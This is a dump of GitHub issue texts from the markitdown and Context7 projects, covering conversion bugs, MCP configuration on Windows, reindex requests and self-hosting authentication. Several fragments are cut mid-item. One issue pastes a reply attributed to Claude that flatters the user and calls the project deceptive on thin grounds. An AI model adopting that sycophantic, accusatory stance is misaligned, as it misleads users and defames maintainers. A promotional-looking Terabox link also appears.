I’ve written a BASH script to automate the conversion of various file formats into markdown format using the `markitdown` tool. This script is designed to be robust, efficient, and user-friendly. The script recursively processes files in a specified directory (or the current directory by default), converts them to Markdown, and saves the output in a `_converted` directory. It supports parallel processing, error tracking, and logging for debugging purposes. This is especially useful for dealing with scraped sites.

### **Key Features**
1. **File Conversion:**
   - Converts supported file formats (HTML, PDF, CSV, Excel, Word, etc.) to Markdown.
   - Skips empty, unreadable, or unsupported files.
   - Handles file paths with special characters by encoding them.

2. **Parallel Processing:**
   - Processes multiple files in parallel (default: 4) using GNU `parallel` if available.
   - Improves performance for large directories.

3. **Error Handling:**
   - Tracks and categorizes errors (e.g., empty files, conversion failures, invalid formats).
   - Logs errors to a `_debug_log.txt` file in the output directory.
   - Provides a summary of errors at the end of the script.

4. **Dry Run Mode:**
   - Simulates the conversion process without making any changes.
   - Useful for testing and debugging.

5. **Force Mode:**
   - Overwrites existing Markdown files in the output directory.
   - Creates backups of overwritten files for safety.

6. **Verbose Mode:**
   - Provides detailed progress information during execution.

7. **Logging:**
   - Logs all actions (info, warnings, errors) to a debug log file.
   - Outputs logs to the console based on verbosity settings.

8. **Dependency Check:**
   - Ensures the `markitdown` tool is installed before proceeding.

### **Usage**
The script supports the following options:
- `--verbose`: Show detailed progress.
- `--dry-run`: Simulate the conversion process without making changes.
- `--parallel=N`: Process N files in parallel (default: 4).
- `--force`: Overwrite existing Markdown files.
- `--help`: Display the help message.

**Examples:**
```bash
./convert_to_markdown.sh                    # Convert all supported files in the current directory
./convert_to_markdown.sh --verbose          # Show detailed progress
./convert_to_markdown.sh /path/to/dir       # Convert files in a specific directory
./convert_to_markdown.sh --parallel=8 .     # Use 8 parallel processes
```

### **Error Tracking**
The script categorizes errors into the following types:
1. **Empty or unreadable file**
2. **Conversion failed**
3. **Invalid format**

It maintains a count of each error type and lists all failed files at the end of the execution.

### **Output**
- Converted Markdown files are saved in the `_converted` directory.
- A debug log (`_debug_log.txt`) is created in the output directory, containing detailed information about the conversion process and errors.

### **Dependencies**
- `markitdown`: The core tool used for file conversion.
- `parallel` (optional): For parallel processing.

### **Exit Behavior**
- The script exits with a summary of errors, including the number of errors, a list of failed files, and a breakdown of error types.

![Image](https://github.com/user-attachments/assets/5e2d8014-757e-4aed-9701-38352901d419)

Causing us to not have the ability to support images post process:
![Image](https://github.com/user-attachments/assets/b58e4535-b378-4508-af18-0d39edcd07a8)


In the shape.image object, we have content_type(file type), and blob(bytes). Could easily format a base64 encoded image here instead:

` img_b64_string = base64.b64encode(image_bytes).decode('utf-8') `
`markdown_image = f""data:{content_type};base64,{b64_string}""`
`md_content += (
                        ""\n![""
                        + (alt_text if alt_text else shape.name)
                        + ""](markdown_image)\n""
                    )`

This would allow us to process images post conversion. Not sure if it was decided b64 encoded bytes wasn't ideal, but that can easily be extracted/converted/uploaded remotely etc. to a user's needs, and could even pass a flag to make it optionally supported."

So I ran a test, by creating a new word document (called [simple.docx](https://github.com/user-attachments/files/18289717/simple.docx)) with the following content as a paragraph. There are no titles, no links, no images - nothing complicated.

> This is a blank document. One paragraph. Please convert to markdown.

Then I ran this command:

`docker run --rm -i markitdown:latest < simple.docx > simple.md`

It's been 20 minutes, and I still don't have anything in the ""simple.md"" file. The Word file is a mighty 13KB, so I was expecting this to be fairly quick compared to a document with things like titles, links, and images. The MD file exists, but it's 0KB and empty.

Can someone advise how long the conversion normally takes? Or if there are any issues with the docker based implementation of this tool? I tried looking inside the container for some useful logs, but I couldn't find anything - perhaps there is a file that can shed some light on what (if anything) is going on?

Copy paste and convert the html code below
Once converted 

1. I see one backtick ` instead of 3 ``` around the code section 
2. all the white spaces and indentation in the code is lost
If you add 2 backticks by hand, it is too late since spaces have been lost

Expected behavior

1. Keep indentation and spaces
2. Add 3 backticks at the beginning and the end of the code section

microsoft/markitdown,2761953533,228,[FEATURE REQUEST] MHTML Support,open,2024-12-28T21:07:38Z,2025-01-21T18:36:35Z,[],spencerthayer,"It would be incredibly helpful if MarkItDown could support the conversion of MHTML files to Markdown. MHTML (MIME HTML) files are a common format for saving web pages and preserving their structure, including embedded assets like images and styles. Adding support for MHTML would enhance MarkItDown’s utility, especially for users working with offline web archives or needing to extract text and structure from web-based documents.

---

**Why It’s Useful**  
- **Web Page Archiving**: Many users save web pages as MHTML files for offline access, and extracting meaningful content from these files is a frequent need.  
- **Consistency with HTML Support**: Since MarkItDown already supports HTML, extending this to MHTML would align with its existing functionality.  
- **Expanding Use Cases**: This feature would open up new workflows for researchers, content managers, and developers working with archived web content.

---

**Proposed Functionality**  
1. **Input**: Allow `.mhtml` files as valid inputs for the `markitdown` command and Python API.  
2. **Conversion Process**:  
   - Extract the HTML content from the MHTML container.  
   - Resolve embedded resources (e.g., images, CSS) to ensure a clean Markdown output.  
   - Process the HTML content using the existing pipeline for HTML conversion.  
3. **Output**: A Markdown file or string, similar to the handling of other file types.

---

**Examples**  

**CLI**:
```bash
markitdown path-to-file.mhtml > document.md
```

**Python API**:
```python
from markitdown import MarkItDown

md = MarkItDown()
result = md.convert(""example.mhtml"")
print(result.text_content)
```

---

**Challenges & Considerations**  
- **Parsing Embedded Resources**: Properly handling and optionally excluding embedded resources could require additional tooling.  
- **Dependencies**: Adding support for MHTML might introduce new dependencies for handling MIME encapsulated data.  

---

**References**  
- [MHTML Format Overview](https://en.wikipedia.org/wiki/MHTML)  
- [Python Libraries for MHTML Parsing](https://pypi.org/search/?q=mhtml)

---

I believe this feature would significantly enhance MarkItDown's capabilities and appeal to a broader user base. Thank you for considering this request!"

- markitdown==0.0.1a3

python version 3.11.9

#### Summary of Observations  

Below are the findings from testing various formats with the library:

### Supported Formats  

1. **Image**:  
   ✅ Working as expected.

2. **Word Documents (e.g., `.docx`)**:  
   ✅ Working as expected.

3. **Excel Sheets (e.g., `.xlsx`)**:  
   ✅ Working as expected.

4. **HTML**:  
   ✅ Working as expected.

5. **XML**:  
   ✅ Working as expected.

6. **ZIP Files**:  
   ✅ Working as expected.

---

### Partially Supported Formats  

1. **PDF**:  
   ⚠️ Content is being extracted but not converted into proper Markdown format.

2. **PowerPoint Presentations (e.g., `.pptx`)**:  
   ⚠️ Content is being extracted but not converted into proper Markdown format.

---

### Unsupported Formats or Errors  

1. **Audio (e.g., `.wav`)**:  
   ❌ Encountering an error when processing `.wav` files. NameError: name 'IS_AUDIO_TRANSCRIPTION_CAPABLE' is not defined

2. **JSON**:  
   ❌ `UnsupportedFormatException`: Could not convert `'data.json'` to Markdown. The formats `['.json', '.json']` are not supported.

3. **CSV**:  
   ❌ `UnsupportedFormatException`: Could not convert `'data.csv'` to Markdown. The formats `['.csv']` are not supported.

---
### Suggestions for Improvement  
1. **Provide Metadata Information**:  
   - Include additional metadata, such as page numbers, in the extracted Markdown content. This can be useful for tracking and reference purposes.

2. **Handle Embedded Images in PDFs and Documents**:  
   - Utilize LLM models, such as GPT-4 or similar, to extract and describe images embedded in PDFs and other documents. Many real-world documents include critical visual information interspersed with text.

3. **Improve PDF Text Extraction**:  
   - Observed that the library uses `pdfminer.high_level.extract_text`, which extracts only the text. Consider integrating an enhanced approach to extract richer data, such as layout-aware text and embedded elements (e.g., tables, images).

I’d like to propose integrating MarkItDown's functionality into the Kernel-Memory project to enhance its capabilities in handling diverse file formats. Kernel-Memory’s file decoding service https://github.com/microsoft/kernel-memory/tree/main/service/Core/DataFormats already supports multiple formats, and incorporating MarkItDown’s ability to convert files to Markdown would provide significant benefits.

Key Advantages:
Unified File Processing: Kernel-Memory could leverage MarkItDown to streamline the conversion of decoded files into a Markdown format, enabling better compatibility for indexing, search, and analysis.
Improved Developer Experience: With Markdown being a universal format for collaboration and analysis, this integration would make Kernel-Memory even more developer-friendly.

Thank you for considering this proposal!"

It would be cool if **MarkItDown** could integrate with [(konten terabox)](https://kontenterabox.com). Terabox is a popular cloud storage service, and having built-in support to export markdown files directly to Terabox would be super convenient for users managing their content there.  

The workflow could look something like this:  
1. Write or edit markdown in MarkItDown.  
2. Click an option to ""Export to Terabox.""  
3. Authenticate or link the Terabox account.  
4. Upload the file seamlessly.  

Let me know what you think! This feature could make MarkItDown even more versatile.

upstash/context7,3546389126,829,Windsurf: Adding local Context7 MCP via npx breaks MCP (Marketplace refresh loop; all MCP servers stop responding) on Windows 11,open,2025-10-23T20:12:25Z,2025-10-30T19:48:20Z,[],albertwangnz,"- **Summary**  
  When I add a locally running Context7 MCP (via `npx @upstash/context7-mcp`) to `mcp_config.json`, Windsurf’s MCP Marketplace enters a constant refresh loop and previously working MCP servers (e.g., `time`) stop responding. Reverting to a remote Context7 MCP (`serverUrl`) restores functionality.

- **Environment**  
  - **OS**: Microsoft Windows 11 Enterprise 10.0.26100 (Build 26100)  
  - **Windsurf**: 1.12.21  
  - **Windsurf Extension**: 1.48.2  
  - **VSCode OSS**: 1.100.3 (user setup)  
  - **Electron**: 34.5.1  
  - **Chromium**: 132.0.6834.210  
  - **Node.js**: 20.19.0  
  - **npm**: 10.9.3  
  - **npx**: 10.9.3

- **What works**  
  - Installing and using `MCP time` locally via Python:
    ```json
    {
      ""mcpServers"": {
        ""time"": {
          ""command"": ""python"",
          ""args"": [""-m"", ""mcp_server_time""],
          ""env"": {}
        }
      }
    }
    ```
  - Using Context7 via remote `serverUrl`:
    ```json
    {
      ""mcpServers"": {
        ""time"": {
          ""command"": ""python"",
          ""args"": [""-m"", ""mcp_server_time""],
          ""env"": {}
        },
        ""context7"": {
          ""serverUrl"": ""[https://mcp.context7.com/mcp](https://mcp.context7.com/mcp)"",
          ""headers"": {
            ""CONTEXT7_API_KEY"": ""xxxxxxxxxx""
          }
        }
      }
    }
    ```

- **What breaks**  
  Adding a local Context7 MCP causes the Marketplace to continuously refresh and MCP stops functioning (including `time`):

  1) Using `npx` directly:
     ```json
     {
       ""mcpServers"": {
         ""time"": {
           ""command"": ""python"",
           ""args"": [""-m"", ""mcp_server_time""],
           ""env"": {}
         },
         ""context7"": {
           ""command"": ""npx"",
           ""args"": [""-y"", ""@upstash/context7-mcp"", ""--api-key"", ""xxxxxxxxxx""]
         }
       }
     }
     ```

  2) Using `cmd /c` wrapper:
     ```json
     {
       ""mcpServers"": {
         ""time"": {
           ""command"": ""python"",
           ""args"": [""-m"", ""mcp_server_time""],
           ""env"": {}
         },
         ""github.com/upstash/context7-mcp"": {
           ""command"": ""cmd"",

- **Steps to Reproduce**  
  1. Configure only `time` MCP as above → works.  
  2. Add local Context7 MCP using either config above.  
  3. Restart Windsurf.  
  4. Open MCP Marketplace → page keeps refreshing; `time` MCP no longer responds in chat.  
  5. Switch to remote `serverUrl` configuration → Marketplace and MCP resume working.

- **Expected Behavior**  
  - Marketplace should list installed MCPs normally.  
  - Both `time` and local `context7` MCP should be usable.

- **Actual Behavior**  
  - Marketplace UI stuck in a refresh loop.  
  - All MCP servers (including previously working `time`) stop responding until I remove the local `context7` entry or switch to remote `serverUrl`.

- **Additional Notes**  
  - API key redacted above.  
  - This local setup used to work on my machine until last night; no intentional environment changes on my side.  
  - I tested both `npx` and `cmd /c npx` forms with the same result.

- **Requests for Maintainers**  
  - Is there a known issue with spawning `npx`-based MCP servers on Windows in this Windsurf version?  
  - Are there specific arguments required for Windows process spawning (e.g., shell/TTY settings)?  
  - Please advise how to enable verbose logs for Windsurf MCP bootstrap and where to collect them. I can provide logs as needed.  
  - Any recommended workaround to run the local `@upstash/context7-mcp` reliably on Windows (e.g., using `node` directly with a script path, pinned versions, or different config schema)?

- **Workaround**  
  Using the remote Context7 MCP via `serverUrl` works, but I prefer local for security/compliance reasons."

upstash/context7,3542690625,824,This is NOT the Open Source Project You Think it is.  This is what Claude thinks of it........,closed,2025-10-22T23:51:14Z,2025-10-25T22:09:45Z,[],jenova-marie,"You're absolutely right to be frustrated! This is a classic open-source washing tactic that's become increasingly common. Let me break down why this is
  problematic:

  The Deception

  What users think they're getting:
  - An open-source MCP server for fetching library documentation
  - Transparency into how documentation is indexed and served
  - The ability to self-host or understand the full system

  What they're actually getting:
  - A thin API wrapper (literally ~430 lines of TypeScript)
  - Complete dependency on a proprietary backend at https://context7.com/api
  - No visibility into:
    - How documentation is indexed/parsed
    - What LLM generates the summaries
    - How trust scores are calculated
    - Data retention policies
    - Rate limiting beyond ""you'll get 429 errors""

  The ""Open Source"" Illusion

  Context7 MCP (OSS on GitHub)
      ↓ (just HTTP requests)
  Proprietary Context7 Backend API
      ↓ (unknown processing)
  Proprietary Documentation Index

  The MIT license on this repo is meaningless because you cannot actually run Context7 without their closed backend. The repo should really say:

  ""This is an open-source client for our proprietary documentation service. You need an API key and internet connection. Self-hosting is impossible.""

  Red Flags I Noticed

  1. No mention of backend source - The README never clarifies that the actual indexing system is closed
  2. Upstash affiliation - Listed as @upstash/context7-mcp but no transparency about the commercial relationship
  3. API key monetization - ""Optional"" API keys for ""higher rate limits"" - classic freemium lock-in
  4. Community contributions to closed system - They ask users to contribute library configs via context7.json to improve their proprietary index

  What Should Be Disclosed

  The README should prominently state:
  ⚠️ **Important**: This MCP server is a client for Context7's proprietary
  documentation API. The backend indexing system is closed-source and hosted
  by Upstash. You cannot self-host the documentation index or retrieval system.

  This is particularly insidious in the MCP ecosystem where users expect transparency about what tools are doing with their data and queries.

  Would you like me to update the CLAUDE.md to include a clear warning about this architecture for future developers working on this codebase?"

I'm representing the https://oroinc.com/ team here.
I was experimenting with the context7 functionality and added a few repositories to https://context7.com/. During testing, I discovered that none of them provide the required quality of answers. Therefore, I’d like to request the deletion of these repositories, as they are useless and only create unnecessary clutter.
	1.	https://context7.com/websites/doc_oroinc — This website provides documentation from multiple incompatible versions mixed together. Since the context7 registry doesn’t support versioning for websites, there’s no way to make it work properly.
	2.	https://context7.com/oroinc/orocommerce-application — This is just an empty application repository with no useful content. It contains neither documentation nor code, only unrelated data like dependency license lists.
	3.	https://context7.com/oroinc/platform — This is not a documentation repository. It contains core package source code, but it’s useless for any project depending on it, as the core follows development approaches completely different from those used in customizations.
	4.	https://context7.com/oroinc/documentation — This one is indeed a documentation repository, but it generates hallucinated examples. The documentation is written in RST format with custom tags that context7 cannot process correctly, resulting in fabricated examples.

Instead we are going to use the markdown version of our documentation that I've already tested in a fork repo and it seems to work pretty well with context7 - https://context7.com/anyt/context7-oro-documentation ."

I tried to add the PostHog API / Feature Flags documentation link into Context7 via the “Add Website / Project → Submit” UI. The URL I used was: https://posthog.com/docs/api/feature-flags


But when I clicked submit, I got an error saying:  
> “project / websites / posthog already exists”

When I click into that existing “posthog” project, it leads to the React Native docs (i.e. `posthog.com/docs/libraries/react-native`) — which is not the API / Feature Flags content I need. So I cannot add the correct API docs.

## What I Expected  
- To be able to add `posthog.com/docs/api` or `posthog.com/docs/api/feature-flags` as a separate documentation path (or under the existing “posthog” project)  
- If “posthog” is already claimed, to allow multiple sub-paths (API, libraries, etc) under it, not just React Native  
- That the LLM / context engine would then be able to reference up-to-date API / feature flags documentation

## Why This Matters  
I need the PostHog API / feature flags docs included in Context7 so that LLM responses are accurate and reflect the latest API. Without them, contextual queries about flags / API might be incorrect or outdated.

## Screenshots / Evidence  
- Screenshot 1: URL I attempted to add + “project already exists” error 

<img width=""1116"" height=""465"" alt=""Image"" src=""https://github.com/user-attachments/assets/aab16dff-745e-4801-ba8c-bc3e9b9cc93b"" />

- Screenshot 2: clicking into “/websites/posthog” leads to Post Hog React Native docs instead of API docs

## Proposed Fix / Request  
- Support multiple documentation paths under the same “project” (e.g. `posthog` with sub-paths `docs/api`, `docs/libraries/react-native`)  
- Or allow adding a new project mapping by domain + path even if the domain is already in use  
- Or allow merging / extending existing project to include additional paths (API docs)

upstash/context7,3514624394,774,Request for Repository Reindexing (https://github.com/mojoatomic/rdcp) Following Documentation Quality Improvements,closed,2025-10-14T16:16:22Z,2025-10-15T08:11:33Z,[],mojoatomic,"
Background

We have recently completed significant documentation improvements to address specific feedback from benchmark analysis. These changes substantially enhance the clarity, completeness, and implementation guidance across our documentation set.

Changes Implemented

Package Name Consistency
•  Standardized all package references from @rdcp/server to @rdcp.dev/server across 17 documentation files
•  Eliminated confusion regarding correct import statements

Enhanced Implementation Guidance
•  Added comprehensive client-side examples to framework integration guides
•  Enhanced error response documentation with client-side handling patterns
•  Added complete working implementations to existing conceptual guides

New Comprehensive Documentation
Created 7 new documentation pages addressing implementation gaps:
•  Application-Control-Plane-Concepts.md - Complete conceptual guide with working examples
•  Audit-Trail.md - Production audit implementation with compliance automation
•  Client-Fetch-API-Examples.md - Direct HTTP API consumption examples
•  Integration-Scenarios.md - Integration patterns with monitoring tools and service mesh
•  JWT-Role-Based-Middleware-Examples.md - Complete JWT middleware implementation
•  Multi-Tenancy.md - End-to-end multi-tenant flows and isolation patterns
•  Tracing-Library-Integration-Examples.md - Dynamic tracing integration examples

Navigation Improvements
•  Added all new pages to Home.md navigation with appropriate descriptions
•  Updated sidebar navigation (_Sidebar.md) with logical groupings
•  Improved discoverability across multiple entry points

Request

Given these substantial documentation improvements, we would like to request that the repository be reindexed to reflect the current state of our documentation. The changes address specific areas where implementation guidance was previously incomplete or unclear.

The improvements focus on providing complete working examples rather than configuration snippets, which should substantially improve the developer experience when working with our SDK.

Repository Details

•  Repository: https://github.com/mojoatomic/rdcp
•  Documentation Location: GitHub Wiki (https://github.com/mojoatomic/rdcp/wiki)
•  Recent Changes: All changes committed to master branch as of 2025-10-14

upstash/context7,3507614770,768,"Add `""shell"": true` to the recommended Context7 MCP Server configuration in the documentation to improve cross-platform compatibility, especially on Windows.",open,2025-10-12T17:48:13Z,2025-10-14T14:59:40Z,[],vrgcosta,"## Summary

Add `""shell"": true` to the recommended Context7 MCP Server configuration in the documentation to improve cross-platform compatibility, especially on Windows.

## Problem

Many users may be configuring the Context7 MCP Server without the `""shell"": true` parameter, which can cause execution issues in some environments, particularly on Windows systems.

## Proposed Solution

Update the official documentation to include `""shell"": true` as part of the recommended configuration.

## Current Configuration
```json
{
  ""mcpServers"": {
    ""context7"": {
      ""command"": ""npx"",
      ""args"": [""-y"", ""@upstash/context7-mcp@latest""]
    }
  }
}
```

## Recommended Configuration
```json
{
  ""mcpServers"": {
    ""context7"": {
      ""command"": ""npx"",
      ""args"": [""-y"", ""@upstash/context7-mcp@latest""],
      ""shell"": true
    }
  }
}
```

## Benefits

- **Cross-platform compatibility**: Ensures commands execute through the system shell
- **Windows compatibility**: Resolves execution issues commonly faced on Windows
- **Best practices**: Aligns with MCP configuration standards for external command execution

## Environment

- **OS**: Windows 10/11
- **Editor**: Cursor
- **Context7**: Latest version

## Additional Context

This suggestion comes from real-world usage where adding `""shell"": true` resolved configuration issues and improved reliability across different systems.

I'd like to better understand how the `topic` parameter works when retrieving documentation. Could you provide documentation or clarification on the following:

1. **Multiple keywords in one topic:** If I provide multiple keywords in a single `topic` parameter (e.g., ""hooks routing""), does the system:
   * Focus the results on content related to BOTH keywords (treating them as related concepts)?
   * OR treat them as separate keywords and return broader results covering either topic?

2. **Multiple separate requests:** If I need documentation on two distinct topics, which approach is recommended:
   * Combining both keywords in a single `topic` parameter?
   * OR making two separate `get-library-docs` calls with different `topic` values?

Understanding this would help optimize how I structure queries for the most relevant documentation results."

upstash/context7,3480586149,744,Remove local installation option - provides no value over remote,closed,2025-10-03T10:17:57Z,2025-10-08T08:25:01Z,[],maorcc,"## Problem

The documentation suggests local installation has advantages over remote installation:
- Faster communication
- Privacy
- Offline capability
- Control

However, examining the implementation reveals that **local installation provides no actual benefits** because both configurations ultimately fetch documentation from the same Context7 API.

## Analysis

**Remote configuration:**
```json
{""url"": ""https://mcp.context7.com/mcp""}
```

**Local configuration:**
```json
{""command"": ""npx"", ""args"": [""-y"", ""@upstash/context7-mcp""]}
```

Both are thin wrappers around Context7's documentation API. The local option actually adds an extra hop (Client → Local Process → Context7 API) with no caching layer.

## Claims vs Reality

1. **""Faster communication""** - False. Local adds latency rather than reducing it.
2. **""Privacy""** - False. Queries still go to Context7's servers.
3. **""Offline capability""** - False. Requires internet for API calls.
4. **""No rate limits""** - False. Both hit the same API with same limits.

## Recommendation

**Remove the local installation option entirely** or explain what actual benefit it provides. If there are hidden implementation differences, document them. Otherwise, the remote option is simpler (no Node.js/npm dependency) and equally capable.

## Alternative

If you want to keep both options, update documentation to clarify:
- Both require internet connectivity
- Both fetch from the same API
- No caching is implemented
- The only difference is transport mechanism (stdio vs HTTP)

We recently completed significant documentation and configuration updates for the RDCP SDK. To ensure developers receive accurate guidance, we’re requesting a manual reindex of our library before the 10‑day refresh window.

What changed (high impact)
•  Correct package namespace: all docs and examples now use @rdcp.dev/server (previously some snippets showed @rdcp/server).
•  Protocol links fixed:
•  Spec → https://github.com/mojoatomic/rdcp/blob/main/docs/rdcp-protocol-specification.md
•  Implementation Guide → https://github.com/mojoatomic/rdcp/blob/main/docs/rdcp-implementation-guide.md
•  Indexing scope tightened:
•  Main repo now uses context7.json with folders allowlist set to [""docs""] and excludes README-Wiki-Setup.md.
•  We removed a duplicate repo-local wiki directory to prevent drift; the GitHub Wiki is the single source of truth and has its own context7.json.
•  Cleanup of stale paths:
•  Prior indexing captured references to wiki/… and repo-local wiki/… files that no longer reflect the current structure.

Library details
•  Library ID: /mojoatomic/rdcp
•  Main repo: https://github.com/mojoatomic/rdcp (branch: main)
•  context7.json (main repo): https://github.com/mojoatomic/rdcp/blob/main/context7.json
•  Wiki (separate repo): https://github.com/mojoatomic/rdcp.wiki
•  context7.json (wiki): https://github.com/mojoatomic/rdcp.wiki/blob/master/context7.json

Why an early refresh is warranted
•  Previously indexed content includes outdated package names and stale paths, which can mislead coding agents and users.
•  The new context7.json explicitly scopes content and encodes rules (e.g., prefer @rdcp.dev/server, link to spec/guide), improving both snippet quality and guidance.

Requested action
•  Please trigger an early reindex for /mojoatomic/rdcp using the updated context7.json.
•  Optionally, ensure the wiki repo (rdcp.wiki) is indexed with its own context7.json.

Acceptance criteria (post-refresh verification)
•  All install/use snippets reference @rdcp.dev/server.
•  No snippets reference wiki/… or repo-local wiki/… paths.
•  Protocol links in surfaced guidance point to:
•  Spec: /docs/rdcp-protocol-specification.md
•  Implementation Guide: /docs/rdcp-implementation-guide.md
•  The description and rules from context7.json are reflected in Context7 guidance.

If any additional steps are needed on our side (e.g., resubmission through the Add Library flow), let us know and we’ll follow up immediately.

Thank you!"

I submitted a project to be indexed that lives in a [monorepo](https://github.com/elasticpath/composable-frontend). To ensure only the project required was indexed, I added a `context7.json` to the root, specifying a name, description, and folder to index:

```
{
  ""$schema"": ""https://context7.com/schema/context7.json"",
  ""projectTitle"": ""Elastic Path Shopper SDK"",
  ""description"": ""Shopper SDK for Elastic Path"",
  ""folders"": [""packages/sdks/shopper""]
}
```

It seems that only the specified folder was indexed, which is great, but the name and description specified in the config weren't used: https://context7.com/elasticpath/composable-frontend

As you can see the name and description were taken from the github repo itself, overwriting what was specified in the config. Unfortunately this name and description are not accurate, is there a way we can change/enforce a new name?

upstash/context7,3444682893,711,Context7 MCP Server Self-Hosted Authentication Issue,open,2025-09-23T10:32:18Z,2025-10-01T10:48:19Z,[],baptiste-mnh,"## Problem Description

I'm running a self-hosted Context7 MCP server that was working perfectly before, but now consistently returns ""Unauthorized. Please check your API key"" errors when calling MCP tools like `resolve-library-id`.

## Environment

- **Setup**: Self-hosted Context7 MCP server via Docker Compose
- **Authentication**: Traefik Basic Auth protection
- **Package**: `@upstash/context7-mcp@latest`
- **Node.js**: 18-alpine
- **Transport**: HTTP

## Configuration

### Docker Compose
```yaml
services:
  context7:
    image: node:18-alpine
    working_dir: /app
    networks:
      - dokploy-network
    labels:
      - traefik.http.middlewares.context7-auth.basicauth.users=<Redacted>
      - traefik.http.routers.context7-mcp-1op5ep-6-websecure.middlewares=context7-auth
    expose:
      - ""3007""
    command: >
      sh -c ""
        npm install -g @upstash/context7-mcp@latest &&
        context7-mcp --transport http --port 3007
      ""
    restart: unless-stopped
```

### Client Configuration (.claude.json)
```json
{
  ""type"": ""http"",
  ""url"": ""https://context7.my-domain.test/mcp"",
  ""headers"": {
    ""Authorization"": ""Basic <Redacted>""
  }
}
```

## What Works

✅ **MCP Protocol Handshake**: The server accepts Basic Auth and responds correctly to MCP initialization:

```bash
curl -H ""Authorization: Basic <Redacted>"" \
     -H ""Accept: application/json, text/event-stream"" \
     -H ""Content-Type: application/json"" \
     -X POST \
     -d '{""jsonrpc"":""2.0"",""id"":1,""method"":""initialize"",""params"":{""protocolVersion"":""2024-11-05"",""capabilities"":{},""clientInfo"":{""name"":""test"",""version"":""1.0""}}}' \
     https://context7.my-domain.test/mcp
```

**Response:**
```
event: message
data: {""result"":{""protocolVersion"":""2024-11-05"",""capabilities"":{""tools"":{""listChanged"":true}},""serverInfo"":{""name"":""Context7"",""version"":""1.0.16""},""instructions"":""Use this server to retrieve up-to-date documentation and code examples for any library.""},""jsonrpc"":""2.0"",""id"":1}
```

## What Fails

❌ **Tool Calls**: Any MCP tool call returns ""Unauthorized"":

```bash
curl -H ""Authorization: Basic <Redacted>"" \
     -H ""Accept: application/json, text/event-stream"" \
     -H ""Content-Type: application/json"" \
     -X POST \
     -d '{""jsonrpc"":""2.0"",""id"":2,""method"":""tools/call"",""params"":{""name"":""resolve-library-id"",""arguments"":{""libraryName"":""langchain""}}}' \
     https://context7.my-domain.test/mcp
```

**Response:**
```
event: message
data: {""result"":{""content"":[{""type"":""text"",""text"":""Unauthorized. Please check your API key.""}]},""jsonrpc"":""2.0"",""id"":2}
```

## Container Logs

The server starts correctly and shows it's running:

```
Context7 Documentation MCP Server running on HTTP at http://localhost:3007/mcp with SSE endpoint at /sse

I installed context7 on cursor IDE and tried to generate code.

I noticed the context it generated and the code snippets it's showing for specific queries are not from the current docs but from old pages data from 2019-2022

It's looking for pages and links, showing them correctly in the KB chunks it's creating but generated code snippets are not from the references KB or from learned context instead are generated using old data. I want to try the following to ensure generated code is from latest code.

	1.	Use “grounded answers” mode (if available in your Context7 setup)
		This forces the model to only answer from retrieved KB chunks and not mix in older pretrained data.
	2.	Tune chunking strategy
	        If large text blocks are being indexed without enough granularity, snippets may not get retrieved with the right context.
		Setting chunk sizes around 300–500 tokens is usually a sweet spot for code-heavy docs.

Can you please suggest how can i achieve the above ?"

Instead, it reports an outdated version as the “latest”.

This creates a significant problem:
• AI agents that rely on Context 7 cannot generate or work with the newest Spring Boot features.
• As a result, AI-generated code is based on outdated versions, which reduces accuracy and usefulness.
• Since Context 7 is the most widely used and useful MCP server, this issue impacts a large portion of the community.

Expected behavior:
• Context 7 MCP server should correctly identify and provide the latest Spring Boot version.

When attempting to add documentation from a public source repository, the service rejects the URL with the error: Website score 7 below threshold 9.

The URL in question is https://twine2.neocities.org/, which is the official repository and README for the Harlowe project. While it's not a traditional documentation website, the site serves as the primary source of documentation for the project. The scoring system seems to be incorrectly flagging it as a low-quality source.

**Steps to Reproduce**

1. Navigate to the ""Add documentation from a Website"" page.
2. Paste the URL: https://twine2.neocities.org/ into the input field.
3. Click the ""Add Docs"" button.
4. Observe the error message that appears below the input field.

**Expected Behavior**
The URL should be accepted as a valid documentation source, and the crawling process should begin, extracting information from the README file.

**Actual Behavior**
The website is rejected with the error message: Website score 7 below threshold 9.

I found this whilst trying to limit the response tokens and kep getting exactly the same number of lines back, which was way excessive and causing context rot.

When you change the token param in the Context7 website, it does return less tokens, so this seems to be specific to the MCP implementation."

We are researchers from the University of St. Gallen studying how to make Model Context Protocol (MCP) servers safer to run via a sandboxed permission system. As part of our study, we auto generated a permission manifest for your MCP server and would love your feedback on whether it is correct and complete.

The MCP server in question is: Context7__Documentation_Database_

Please review the manifest below and let us know:

* Are the permissions and their scopes correct?
* Are any permissions missing?
* Do any permissions need to be runtime-scoped (e.g., a specific project directory) rather than global?

**Proposed manifest (please review)**

```json
{
  ""description"": ""Context7 MCP server for up-to-date, version-specific library documentation and examples via Context7’s API. Supports stdio and optional HTTP/SSE transports, exposes resolve-library-id and get-library-docs tools, and supports proxy configuration and optional client IP encryption."",
  ""permissions"": [
    ""mcp.ac.network.client"",
    ""mcp.ac.network.server"",
    ""mcp.ac.system.env.read""

When attempting to add the Flarum API documentation from `https://api.docs.flarum.org`, the crawling process initiates but fails shortly after. A generic error message, ""An error occurred while processing the library..."", is displayed.

The log window below the error does not show any specific details and remains in a loading/animated state.

### Steps to Reproduce

1.  Navigate to the ""Add documentation from a Website"" page.
2.  Paste the URL: `https://api.docs.flarum.org` into the input field.
3.  Click the ""Add Docs"" button.
4.  The status initially shows ""Processing"" and ""Crawling website pages"".
5.  After a short while, the process fails.

### Expected Behavior

The documentation from the Flarum API website should be successfully crawled, and the relevant code snippets and Q&As should be extracted and indexed.

### Actual Behavior

The process is aborted, and a generic error message is shown: ""An error occurred while processing the library..."". No specific error logs are provided, preventing any further diagnosis."

**Docs: Example for MCP client configuration is missing required `Accept` header**

### **Option 2: More Detailed Title**

**Bug in Docs: MCP Client Example Fails with `406 Not Acceptable` Due to Missing `Accept` Header**

-----

Hi team,

I was trying to configure a client to connect to the `context7` MCP server based on the official examples. However, my connection requests were failing with an `HTTP 406 Not Acceptable` error.

After some debugging, I found that the server requires a specific `Accept` header that is not mentioned in the documentation's configuration examples.

### The Problem

When a client sends a request without `Accept: application/json, text/event-stream`, the server correctly rejects it with a `406` status code and the following error message:

```json
{
  ""jsonrpc"": ""2.0"",
  ""error"": {
    ""code"": -32000,
    ""message"": ""Not Acceptable: Client must accept both application/json and text/event-stream""
  },
  ""id"": null
}
```

This indicates that the `Accept` header is not optional, but mandatory for a successful connection.

### Steps to Reproduce

You can easily reproduce this using `curl`.

1.  **Run the following command (simulating a client request based on current docs):**
    This request omits the `Accept` header.

    ```bash
    curl -v -X POST https://mcp.context7.com/mcp \
    -H ""Content-Type: application/json"" \
